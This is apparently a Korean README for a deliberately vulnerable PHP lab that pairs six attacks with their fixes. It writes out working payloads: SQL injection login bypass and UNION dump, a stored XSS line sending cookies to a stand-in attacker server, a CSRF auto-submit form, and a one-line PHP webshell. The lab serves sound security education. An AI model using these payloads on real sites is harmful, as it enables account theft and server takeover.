# 밑줄(Mitjul) — 웹 취약점 Before/After 실습 랩

> ⚠️ **교육·실습용 프로젝트입니다.** `app/vulnerable/` 는 학습 목적으로 **의도적으로 취약하게** 만든 코드이며,
> 실제 서비스로 배포하거나 공개 인터넷에 노출하지 마세요. 반드시 격리된 로컬(VM) 환경에서만, 본인 소유의 가상 데이터로만 실행하세요.
> 제작: 김가은 (Gaeun Kim) · 개인 보안 학습 포트폴리오.

> 책에서 밑줄 친 문장을 모아 공유하는 커뮤니티 "밑줄"을 **일부러 취약하게** 만든 버전과, 같은 기능을 **안전하게 고친** 버전으로 나란히 구성한 보안 실습 프로젝트입니다.
> 웹 애플리케이션의 대표 취약점 6종을 **직접 공격 → 코드로 방어 → 재검증**하는 흐름으로 정리했습니다.
>
> **작성자**: 김가은 · SKT ALEPH AI 인프라보안 과정
> **스택**: PHP 8.2 · MariaDB 11 · Apache · Docker Compose

> **v3 안내** — v2(보안 강화)에 더해 **디자인 리뉴얼**(시안 톤: 종이·매거진, Pretendard+나눔명조)과
> **가벼운 기능**(카테고리 소설/에세이/시/인문, 나의 기록 마이페이지)을 추가했습니다. **취약점 6종의 취약/방어
> 로직은 그대로**라 공격 재현·캡처에는 영향이 없습니다(디자인 변경은 CSS·레이아웃·마크업만). 사진은 톤
> 플레이스홀더이며 자유 이미지로 교체할 수 있습니다. 아래는 v2에서 적용한 보안 강화 요약입니다.
>
> (v2 보안) 취약점 6종은 그대로 두고, 보완 버전·공통 환경의 보안을
> 추가로 강화했습니다(DB 계정 분리·`.env`·보안 헤더·세션 분리·비밀번호 재설정 토큰 흐름 등).
> 상세: [`docs/CHANGELOG.md`](docs/CHANGELOG.md) · 분석보고서 [`docs/SECURITY_REPORT.md`](docs/SECURITY_REPORT.md) ·
> 검증 [`docs/TEST_RESULTS.md`](docs/TEST_RESULTS.md) · 재현 [`docs/REPRODUCE.md`](docs/REPRODUCE.md).
> 이 zip에는 바로 동작하는 `.env`가 포함되어 있어 `docker compose up --build`로 바로 실행됩니다
> (GitHub 등으로 clone한 경우엔 `.env`가 제외되므로 `cp .env.example .env` 후 값을 채우세요).

> **용어·판정 기준(정확도)** — ① 이 랩의 XSS는 **저장형(Stored)** 중심이며, "스크립트 실행 차단(이스케이프)"과
> "쿠키 접근 차단(HttpOnly)"은 **별개 방어**입니다. ② 비밀번호는 **해시(단방향)**이며 "암호화"가 아닙니다.
> ③ 파일 업로드는 **"업로드 거부"와 "서버 실행 차단"을 구분**합니다. ④ IDOR 판정은 403 여부가 아니라
> **타인 데이터가 실제로 노출/변경되는지**로 하며, **공개 게시글 조회는 정상 기능(IDOR 아님)**입니다.

---


## 공격 재현 증거 (before/after)

취약(8001)에서 공격이 통하고, 보완(8080)에서 막히는 것을 각 1쌍씩 캡처했습니다. 전체는 `docs/images/` 참고.

| 취약점 | 취약(before) | 보완(after) |
|---|---|---|
| SQLi 로그인 우회 | 01-sqli-login-before.png | 01-sqli-login-after.png |
| SQLi 정보탈취(sqlmap) | 02-sqli-dump-before.png | 02-sqli-dump-after.png |
| 저장형 XSS | 03-xss-before.png | 03-xss-after.png |
| IDOR/권한 우회 | 04-idor-before.png | 04-idor-after.png |
| CSRF | 05-csrf-before.png | 05-csrf-after-token.png |
| 파일 업로드 RCE | 06-upload-before.png | 06-upload-after.png |


## 0. 이 프로젝트를 만든 이유

웹 서비스의 취약점은 대부분 몇 가지 "나쁜 습관"이 반복되면서 생깁니다. 이 랩은 그 습관을 **같은 코드에서 취약/보완 두 벌로** 비교할 수 있게 만들어, "무엇이 위험한지"가 아니라 **"왜 위험하고, 어떻게 고치는지"** 를 손으로 확인하는 데 목적이 있습니다.

| # | 나쁜 습관 | 그래서 생기는 취약점 |
|---|---|---|
| 1 | 사용자 입력을 SQL 문자열에 그대로 이어붙인다 | **SQL Injection** |
| 2 | DB 값을 화면에 그대로 출력한다 | **저장형 XSS** |
| 3 | "로그인했는지"만 보고 "자격이 있는지"는 안 본다 | **권한 우회 / IDOR** |
| 4 | 요청이 진짜 본인 의도인지 검증하지 않는다 | **CSRF** |
| 5 | 비밀번호를 평문으로 저장/비교한다 | **계정 탈취 피해 확산** |
| 6 | 업로드 파일의 종류·저장위치·실행을 통제하지 않는다 | **파일 업로드 → RCE** |

---

## 1. 구성 & 실행

### 디렉터리

```
mitjul-vuln-lab/
├── docker-compose.yml          # db / vulnerable / secure 3개 서비스
├── docker/Dockerfile           # php:8.2-apache + mysqli
├── db/init.sql                 # 두 개의 DB 자동 생성 + 시드 (비밀번호 없음)
├── db/users.sh                 # .env 값으로 앱 전용 DB 계정 생성 (v4)
│                               #   mitjul_vuln   → 비밀번호 평문 저장
│                               #   mitjul_secure → 비밀번호 bcrypt 해시
├── app/
│   ├── vulnerable/             # 취약 버전 (웹루트)  → http://localhost:8001
│   └── secure/                 # 보완 버전 (웹루트)  → http://localhost:8080
└── docs/REPRODUCE.md           # 공격 재현 실습 가이드(요약)
```

취약/보완 두 버전은 **화면·기능은 동일**하고, 데이터 접근·출력·권한검사 코드만 다릅니다. 각 서비스는 같은 MariaDB 서버의 **서로 다른 DB**를 쓰기 때문에 서로 간섭하지 않습니다. 화면 우측 상단 배지(`VULNERABLE` / `SECURE`)로 어느 버전인지 구분합니다.

### 실행

```bash
docker compose up --build      # zip에 동작하는 .env 포함 — 바로 실행됨
# (GitHub에서 clone한 경우에만) cp .env.example .env 후 값 설정
```

- 취약 버전: <http://localhost:8001>
- 보완 버전: <http://localhost:8080>

```bash
docker compose down       # 종료 (DB 데이터 유지)
docker compose down -v     # DB 볼륨까지 삭제 후 처음부터 다시 시드 (.env 의 DB 비밀번호를 바꿨다면 필수)
# 비밀번호 재설정 시연: .env 의 RESET_DEV_MODE=true 일 때만 인증코드가 화면에 표시 (기본 false = 기능 비활성)
```

### 테스트 계정 (두 버전 공통)

| 아이디 | 비밀번호 | 권한 |
|---|---|---|
| `admin` | `Admin!234` | 관리자 |
| `yuna`  | `yuna1234`  | 일반 |
| `minho` | `minho1234` | 일반 |
| `gaeun` | `gaeun1234` | 일반 |

---

## 2. 취약점 상세 (Before → Attack → After)

각 항목은 **① 원리 → ② 취약 코드 → ③ 공격 재현 → ④ 보완 코드 → ⑤ 재검증** 순서입니다.
코드 위치는 취약 버전은 `app/vulnerable/`, 보완 버전은 `app/secure/` 기준입니다.

---

### 2-1. SQL Injection

**① 원리.** 로그인·검색·조회 쿼리에 사용자 입력을 문자열로 그대로 이어붙이면, 공격자가 따옴표와 SQL 문법을 섞어 쿼리의 구조 자체를 바꿀 수 있습니다.

**② 취약 코드** — `account/login_process.php`
```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);
```

**③ 공격 재현**

- (a) **로그인 우회** — 로그인 폼 아이디 칸에 아래를 넣고 비밀번호는 아무 값:
  ```
  admin' -- 
  ```
  완성 쿼리 → `... WHERE username = 'admin' -- ' AND password = '...'`
  `--` 뒤 비밀번호 조건이 주석 처리되어 **비밀번호 없이 admin 로그인**.

- (b) **회원정보 통째 탈취(UNION)** — 문장 목록 검색창(`board/list.php`)에 입력:
  ```
  zzz' UNION SELECT id, username, '-', password, '-', role FROM users -- 
  ```
  목록이 5개 컬럼을 출력하므로, 열 개수를 맞춘 `UNION`으로 **전체 회원의 아이디·비밀번호**가 "문장 제목"인 것처럼 노출됩니다. (평문 저장이라 그대로 로그인 가능 — 2-5 참고.)

- (c) **URL 숫자 하나로 대량 파괴** — `account/delete_account.php` 의 `id` 를 `1 OR 1=1` 로 바꾸면 `DELETE FROM users WHERE id = 1 OR 1=1` → **전체 회원 삭제**.

**④ 보완 코드** — Prepared Statement (값을 SQL 구조와 분리해 바인딩)
```php
// account/login_process.php (secure)
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$user = $stmt->get_result()->fetch_assoc();
```
`id` 처럼 숫자인 값은 `bind_param("i", $id)` 로 정수 바인딩하여, 문자·기호가 섞여도 숫자로만 처리됩니다. 프로젝트 전체에서 `query()` 문자열 조립을 **단 한 곳도 쓰지 않도록** 전환했습니다.

**⑤ 재검증.** 보완 버전(8080)에서 `admin' -- ` 로 로그인 시 그대로 실패하고, 검색창 UNION 구문은 그냥 "검색 결과 없음"으로 처리됩니다.

---

### 2-2. 저장형 XSS (Stored Cross-Site Scripting)

**① 원리.** DB에 저장된 값을 화면에 그대로 출력하면, `<script>` 가 "글자"가 아니라 "실행할 코드"로 해석됩니다. 저장형은 한 번 심어두면 그 글을 여는 **모든 사람**이 당합니다.

**② 취약 코드** — `board/view.php`
```php
<p class="big-quote"><?php echo $post['title']; ?></p>
<div class="body"><?php echo nl2br($post['content']); ?></div>
```
(`nl2br` 은 줄바꿈을 `<br>` 로 바꿀 뿐 보안과 무관.)

**③ 공격 재현.** 문장 쓰기(`board/write.php`)에서 "밑줄 친 문장" 칸에:
```html
<script>new Image().src='http://공격자서버:8000/steal?c='+document.cookie;</script>
```
다른 사용자(특히 관리자)가 이 문장을 **열어보는 순간** 세션 쿠키가 공격자 서버로 전송됩니다.
→ 이 쿠키를 그대로 sqlmap 등에 실으면 로그인 없이 관리자 권한으로 DB를 덤프할 수 있습니다(**취약점 체이닝**).

**④ 보완 코드.** 출력 직전 예외 없이 `htmlspecialchars()` 로 이스케이프.
```php
// board/view.php (secure)
<p class="big-quote"><?php echo htmlspecialchars($post['title'], ENT_QUOTES, 'UTF-8'); ?></p>
<div class="body"><?php echo nl2br(htmlspecialchars($post['content'], ENT_QUOTES, 'UTF-8')); ?></div>
```
목록·상세·헤더(로그인 이름) 등 **사용자 입력이 화면에 나가는 모든 지점**에 적용했습니다. 핵심은 "입력 시 막기"가 아니라 "**출력할 때마다** 이스케이프".

**⑤ 재검증.** 보완 버전에서 같은 글을 열면 `<script>...` 가 `&lt;script&gt;...` 로 표시되어 **글자 그대로** 보일 뿐 실행되지 않습니다. (실제로 본 저장소의 테스트 하네스로 확인: 취약=원문 출력, 보완=이스케이프 출력.)

---

### 2-3. 권한 우회 / IDOR (Broken Access Control)

**① 원리.** "로그인 여부"만 확인하고 "이 대상의 주인이 맞는지"를 서버에서 확인하지 않을 때 발생합니다. 화면에서 버튼을 숨겨도, URL·폼을 직접 호출하면 그만입니다.

**② 취약 코드**

- `account/edit.php` — URL 의 `id` 를 그대로 받고 본인/관리자 확인 없음:
  ```php
  $id = $_GET['id'] ?? $_SESSION['user_id'];   // 남의 id 로 바꿔치기 가능
  ```
- `board/edit.php`, `board/delete.php` — 작성자 본인인지 검사하지 않음. `view.php` 의 `$can_manage` 는 **버튼 노출용일 뿐** 실제 처리에는 아무 검사가 없음.

**③ 공격 재현.**
- 학생 계정으로 로그인 후 `account/edit.php?id=1` 접속 → **관리자의 이름·이메일·비밀번호 수정 폼**이 그대로 열림.
- 남의 문장 번호만 알면 `board/delete.php` 로 POST 를 보내 **다른 사람 글 삭제** 가능.

**④ 보완 코드.** 화면과 별개로, DB를 바꾸기 직전 서버에서 소유자/관리자를 **항상** 재검증.
```php
// includes/auth.php (secure)
function canManagePost($post) {
    if (isAdmin()) return true;
    return isLoggedIn() && $_SESSION['user_id'] == $post['user_id'];
}
// board/edit.php / delete.php (secure)
if (!canManagePost($post)) { http_response_code(403); die("수정 권한이 없습니다."); }
```
본인 정보 수정/탈퇴는 아예 `$_GET['id']` 를 받지 않고 **세션의 본인 id만** 사용하도록 바꿨습니다.

**⑤ 재검증.** 일반 계정으로 남의 글 `edit.php?id=…` 호출 시 `403 수정 권한이 없습니다.` 로 차단됨(테스트 하네스로 확인).

---

### 2-4. CSRF (Cross-Site Request Forgery)

**① 원리.** 브라우저는 요청 시 로그인 쿠키를 자동으로 함께 보냅니다. 공격자가 피해자를 유도해 특정 요청을 "대신" 보내게 만들면, 서버는 정상 요청으로 착각합니다.

**② 취약 코드.** 상태를 바꾸는 모든 폼(문장 작성/수정/삭제, 회원정보 수정/탈퇴)에 CSRF 토큰이 **전혀 없음**.

**③ 공격 재현.** 3번(IDOR)과 결합하면 피해자가 링크를 열기만 해도 요청이 나갑니다.
```html
<form action="http://localhost:8001/board/delete.php" method="post">
  <input type="hidden" name="id" value="1">
</form>
<script>document.forms[0].submit();</script>
```

**④ 보완 코드.** 세션에 무작위 토큰을 1회 발급하고(`includes/auth.php`), 모든 상태변경 폼에 hidden 으로 심은 뒤, 처리 직전 타이밍 공격에 안전한 `hash_equals()` 로 검증.
```php
// includes/auth.php (secure)
$_SESSION['csrf_token'] = $_SESSION['csrf_token'] ?? bin2hex(random_bytes(32));
function csrf_check() {
    if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
        http_response_code(403); die("잘못된 요청입니다. (CSRF 토큰 불일치)");
    }
}
```

**⑤ 재검증.** 외부 폼(토큰 없음)으로 `delete.php` POST 시 `403 잘못된 요청입니다.` 로 차단됨(테스트 하네스로 확인).

---

### 2-5. 비밀번호 평문 저장 / 평문 비교

**① 원리.** 정상 서비스는 비밀번호를 되돌릴 수 없는 해시로 저장하고(`password_hash`), 로그인 시 원문이 그 해시에 맞는지만 검증합니다(`password_verify`).

**② 취약 코드.** `register.php` 는 입력값을 그대로 INSERT, `login_process.php` 는 문자열 그대로 비교. 시드 DB(`mitjul_vuln`)의 `users.password` 도 평문.

**③ 왜 위험한가(합성 효과).** 2-1 의 UNION 공격으로 password 컬럼이 유출되면, 평문이라 **훔치는 즉시 로그인**에 쓸 수 있습니다. 비밀번호 재사용 때문에 다른 사이트까지 뚫는 크리덴셜 스터핑의 재료가 됩니다.

**④ 보완 코드.**
```php
// register.php (secure)
$hashed = password_hash($password, PASSWORD_DEFAULT);
// login_process.php (secure)
if ($user && password_verify($password, $user['password'])) { ... }
```
보완 DB(`mitjul_secure`)는 동일한 비밀번호를 **bcrypt 해시**로 시드했습니다. 설령 password 컬럼이 통째로 유출되어도 해시뿐이라 바로 로그인에 쓸 수 없습니다.

**⑤ 재검증.** 보완 DB에서 `SELECT password FROM users` 하면 `$2y$...` 해시만 나옵니다.

---

### 2-6. 무제한 파일 업로드 → 원격 코드 실행(RCE)

**① 원리.** 업로드 시 (1) 확장자, (2) 실제 내용(MIME), (3) 저장 폴더의 스크립트 실행 차단 중 하나라도 빠지면, "이미지"로 위장한 `.php` 웹쉘이 서버에서 실행될 수 있습니다.

**② 취약 코드** — `board/write.php`
```php
$original = basename($_FILES['image']['name']);
$stored   = $post_id . "_" . $original;        // 예측 가능한 이름, 확장자 검사 없음
move_uploaded_file($_FILES['image']['tmp_name'], __DIR__."/../uploads/".$stored);
```
확장자·MIME 검사 없음 + 웹에서 바로 접근 가능한 `uploads/` 에 그대로 저장 + `.htaccess` 없음.

**③ 공격 재현.** 아래 웹쉘을 `shell.php` 로 올림(필사 이미지 자리에 첨부):
```php
<?php system($_GET['cmd']); ?>
```
글 번호가 42라면 저장 경로는 `uploads/42_shell.php`. 브라우저에서:
```
http://localhost:8001/uploads/42_shell.php?cmd=id
```
→ 서버가 `id` 명령을 실행해 결과를 반환(**웹서버 프로세스 권한의 RCE**). 참고로 `$original` 파일명 자체도 SQL에 그대로 들어가 **또 다른 SQLi 지점**이었습니다.

**④ 보완 코드** — 확장자 화이트리스트 + 매직바이트(MIME) 검사 + 랜덤 파일명 + 폴더 실행 차단.
```php
// board/write.php (secure)
$allowed_ext  = ['jpg','jpeg','png','gif','webp'];
$allowed_mime = ['image/jpeg','image/png','image/gif','image/webp'];
$mime = finfo_file(finfo_open(FILEINFO_MIME_TYPE), $_FILES['image']['tmp_name']);
if (!in_array($ext,$allowed_ext,true) || !in_array($mime,$allowed_mime,true)) { /* 거부 */ }
$stored = bin2hex(random_bytes(16)) . "." . $ext;     // 예측 불가능한 이름
// DB 기록도 Prepared Statement 로
```
추가로 `app/secure/uploads/.htaccess` 에서 `.php` 류 실행을 원천 차단:
```apache
<FilesMatch "\.(php|php3|php4|php5|php7|phtml|pht|phar)$">
    Require all denied
</FilesMatch>
```
확장자(`report.pdf.php`)와 MIME(이름만 바꾼 `shell.jpg`)를 **동시에** 검사해야 우회가 막힙니다.

**⑤ 재검증.** 보완 버전에 `shell.php` 업로드 시 "이미지 파일만 올릴 수 있어요"로 거부되고, 설령 저장되더라도 `.htaccess` 때문에 접근 시 403.

---

## 3. 정리 표

| # | 취약점 | 취약 버전 핵심 원인 | 보완 방법 |
|---|---|---|---|
| 1 | SQL Injection | 입력을 SQL 문자열에 그대로 이어붙임 | Prepared Statement (`prepare`/`bind_param`) |
| 2 | 저장형 XSS | 출력 시 이스케이프 누락 | 출력마다 `htmlspecialchars()` |
| 3 | 권한 우회 / IDOR | 소유자/관리자 서버측 재검증 없음 | `canManagePost()` 재검증 + 세션 id 사용 |
| 4 | CSRF | 토큰 자체가 없음 | 세션 토큰 발급 + `hash_equals()` 검증 |
| 5 | 평문 비밀번호 | `password_hash`/`verify` 미사용 | bcrypt 해시 저장·검증 |
| 6 | 파일 업로드(RCE) | 확장자·MIME·실행 통제 없음 | 화이트리스트 + MIME + 랜덤명 + `.htaccess` |

> 추가로 보완 버전은 세션 쿠키 `HttpOnly`/`SameSite` 설정과 로그인 직후 `session_regenerate_id()`(세션 고정 방지)도 함께 적용했습니다.

이 프로젝트의 학습 포인트는 "하나만 막으면 되는" 게 아니라 **입력 검증 → 출력 이스케이프 → 권한 검사 → 요청 위조 방지 → 암호화** 라는 여러 겹의 방어선을 **동시에** 세워야 한다는 점입니다. 2-2(XSS)→2-5(평문)→2-1(SQLi) 처럼 취약점은 서로 연결되어 피해가 커지기 때문입니다.

---

## 4. 참고

- 교육·실습 목적의 **의도적으로 취약한** 애플리케이션입니다. `vulnerable` 버전을 **공개 인터넷에 올리지 마세요.** 로컬(Docker) 안에서만 사용합니다.
- 모든 PHP 파일은 `php -l` 문법 검사를 통과했고, 각 페이지의 렌더링과 XSS/IDOR/CSRF 전후 동작을 목(mock) DB 기반 테스트 하네스로 검증했습니다. SQL Injection·업로드 RCE 등 DB·웹서버가 필요한 시나리오는 위 재현 절차로 직접 확인할 수 있습니다.
- 공격 재현 실습 순서는 `docs/REPRODUCE.md` 에 요약해 두었습니다.
